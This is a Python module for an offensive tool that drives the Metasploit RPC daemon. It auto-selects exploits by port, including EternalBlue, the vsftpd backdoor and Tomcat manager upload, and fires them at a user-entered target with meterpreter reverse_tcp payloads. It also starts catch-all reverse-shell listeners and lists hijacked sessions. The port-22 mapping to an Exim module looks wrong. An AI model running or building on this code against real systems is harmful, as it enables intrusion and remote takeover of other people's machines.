import os
import time
import subprocess
import socket
import string
import random
import questionary
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from core.ui import draw_header, Q_STYLE
from core.context import ctx
from core.database import db

try:
    from pymetasploit3.msfrpc import MsfRpcClient
except ImportError:
    pass

console = Console()


class MetasploitRPCEngine:
    def __init__(self):
        self.client = None
        self.daemon_process = None
        self.password = ''.join(random.choices(
            string.ascii_letters + string.digits, k=16))
        self.rpc_port = 55554
        self.msfrpcd_path = self.find_msfrpcd()

    def find_msfrpcd(self):
        """Locates the msfrpcd executable on the system, bypassing sudo PATH issues."""
        common_paths = [
            "/opt/metasploit-framework/bin/msfrpcd",  # Official installer
            "/opt/homebrew/bin/msfrpcd",              # Apple Silicon Mac
            "/usr/local/bin/msfrpcd",                 # Intel Mac
            "/usr/bin/msfrpcd"                        # Kali Linux
        ]

        try:
            path = subprocess.run(
                ['which', 'msfrpcd'], capture_output=True, text=True).stdout.strip()
            if os.path.exists(path):
                return path
        except:
            pass

        for p in common_paths:
            if os.path.exists(p):
                return p

        return None

    def check_dependencies(self):
        try:
            import pymetasploit3
        except ImportError:
            console.print(
                "[bold red][!] Critical Dependency Missing: 'pymetasploit3'[/bold red]")
            return False

        if not self.msfrpcd_path:
            console.print(
                "[bold red][!] Metasploit Framework ('msfrpcd') not found on this system![/bold red]")
            return False

        return True

    def is_port_open(self, port):
        """Checks if a local port is listening."""
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            return s.connect_ex(('127.0.0.1', port)) == 0

    def start_daemon(self):
        """Silently boots the Metasploit RPC server in the background."""
        if self.is_port_open(self.rpc_port):
            os.system(f"fuser -k {self.rpc_port}/tcp > /dev/null 2>&1")
            time.sleep(1)

        with console.status("[bold cyan]Booting Headless Metasploit Engine (This takes ~10-15 seconds)...[/bold cyan]", spinner="bouncingBar"):
            cmd = [self.msfrpcd_path, "-P", self.password, "-n",
                   "-f", "-a", "127.0.0.1", "-p", str(self.rpc_port)]
            self.daemon_process = subprocess.Popen(
                cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

            for _ in range(40):
                if self.is_port_open(self.rpc_port):
                    # Extra buffer for MSF to load modules into memory
                    time.sleep(3)
                    return True
                time.sleep(1)

        return False

    def connect_rpc(self):
        """Connects Davoid to the newly spawned MSF Daemon."""
        if self.client:
            return True

        if not self.start_daemon():
            console.print(
                "[bold red][!] Failed to boot Metasploit Daemon. Ensure Metasploit is installed correctly.[/bold red]")
            return False

        console.print("[*] Negotiating API connection...")
        try:
            self.client = MsfRpcClient(
                self.password, server='127.0.0.1', port=self.rpc_port, ssl=True)
            console.print(
                "[bold green][+] MSF-RPC Authenticated Successfully![/bold green]")
            time.sleep(1)
            return True
        except Exception as e:
            console.print(
                f"[bold red][!] RPC Connection Failed:[/bold red] {e}")
            return False

    def auto_exploit(self):
        """Silently configures and launches an exploit via API."""
        default_rhost = ctx.get("RHOST") or "192.168.1.1"
        default_lhost = ctx.get("LHOST") or "127.0.0.1"

        target = questionary.text(
            "Target IP (RHOST):", default=default_rhost, style=Q_STYLE).ask()
        if not target:
            return

        rport_input = questionary.text(
            "Target Port (RPORT):", style=Q_STYLE).ask()
        if not rport_input:
            return
        rport = int(rport_input)

        lhost = questionary.text(
            "Your IP (LHOST):", default=default_lhost, style=Q_STYLE).ask()

        port_exploits = {
            21: "unix/ftp/vsftpd_234_backdoor",
            22: "linux/ssh/exim_pe_injection",
            80: "multi/http/apache_normalize_path_rce",
            445: "windows/smb/ms17_010_eternalblue",
            8080: "multi/http/tomcat_mgr_upload"
        }

        module_name = port_exploits.get(rport, "multi/handler")
        custom_mod = questionary.text(
            f"Exploit Module (Default: {module_name}):", default=module_name, style=Q_STYLE).ask()
        if not custom_mod:
            return

        payload = "windows/x64/meterpreter/reverse_tcp"
        if "unix" in custom_mod or "linux" in custom_mod or "apache" in custom_mod:
            payload = "cmd/unix/interact"

        custom_payload = questionary.text(
            f"Payload (Default: {payload}):", default=payload, style=Q_STYLE).ask()

        console.print(Panel(
            f"[bold cyan]Deploying Exploit via API...[/bold cyan]\n[white]Target:[/white] {target}:{rport}\n[white]Module:[/white] {custom_mod}", border_style="red"))

        try:
            exploit = self.client.modules.use('exploit', custom_mod)
            exploit['RHOSTS'] = target
            exploit['RPORT'] = rport

            payload_opts = {'LHOST': lhost, 'LPORT': 4444}
            job = exploit.execute(payload=custom_payload, **payload_opts)

            if job['job_id'] is not None:
                console.print(
                    f"[bold green][+] Exploit launched successfully (Job ID: {job['job_id']})[/bold green]")
                db.log("MSF-Engine", target,
                       f"Launched {custom_mod} via RPC", "HIGH")
            else:
                console.print(
                    "[yellow][!] Exploit ran, but no background job was created.[/yellow]")
        except Exception as e:
            console.print(
                f"[bold red][!] Exploit execution failed:[/bold red] {e}")

    def list_sessions(self):
        """Pulls live session data from the Metasploit Daemon."""
        sessions = self.client.sessions.list

        if not sessions:
            console.print("[yellow][!] No active MSF sessions found.[/yellow]")
            return

        table = Table(title="Active MSF Sessions (RPC)", border_style="green")
        table.add_column("Session ID", style="cyan")
        table.add_column("Type", style="magenta")
        table.add_column("Target IP", style="white")
        table.add_column("Details", style="dim")

        for session_id, data in sessions.items():
            table.add_row(
                str(session_id),
                data.get('type', 'Unknown'),
                data.get('target_host', 'Unknown'),
                data.get('info', 'No Info')
            )

        console.print(table)

    def cleanup(self):
        """Kills the background daemon when leaving the module."""
        if self.daemon_process:
            console.print(
                "[dim][*] Shutting down background Metasploit Daemon...[/dim]")
            self.daemon_process.terminate()

    def run(self):
        draw_header("Metasploit RPC Orchestrator")

        if not self.check_dependencies():
            questionary.press_any_key_to_continue(style=Q_STYLE).ask()
            return

        if not self.connect_rpc():
            questionary.press_any_key_to_continue(style=Q_STYLE).ask()
            return

        try:
            while True:
                choice = questionary.select(
                    "MSF-RPC Operations:",
                    choices=[
                        "1. Auto-Exploit Target (Background Job)",
                        "2. List Active Sessions",
                        "3. Start Generic Catch-All Listener (Multi/Handler)",
                        "Back"
                    ], style=Q_STYLE
                ).ask()

                if not choice or choice == "Back":
                    break
                elif "Auto-Exploit" in choice:
                    self.auto_exploit()
                    questionary.press_any_key_to_continue(style=Q_STYLE).ask()
                elif "List Active" in choice:
                    self.list_sessions()
                    questionary.press_any_key_to_continue(style=Q_STYLE).ask()
                elif "Listener" in choice:
                    lhost = ctx.get("LHOST") or "0.0.0.0"
                    lport = questionary.text(
                        "LPORT:", default="4444", style=Q_STYLE).ask()
                    payload = questionary.text(
                        "Payload:", default="windows/x64/meterpreter/reverse_tcp", style=Q_STYLE).ask()

                    try:
                        exploit = self.client.modules.use(
                            'exploit', 'multi/handler')
                        job = exploit.execute(
                            payload=payload, LHOST=lhost, LPORT=int(lport))
                        console.print(
                            f"[bold green][+] Listener started in background (Job ID: {job['job_id']})[/bold green]")
                    except Exception as e:
                        console.print(
                            f"[red][!] Failed to start listener: {e}[/red]")
                    questionary.press_any_key_to_continue(style=Q_STYLE).ask()
        finally:
            self.cleanup()


def run_msf():
    engine = MetasploitRPCEngine()
    engine.run()
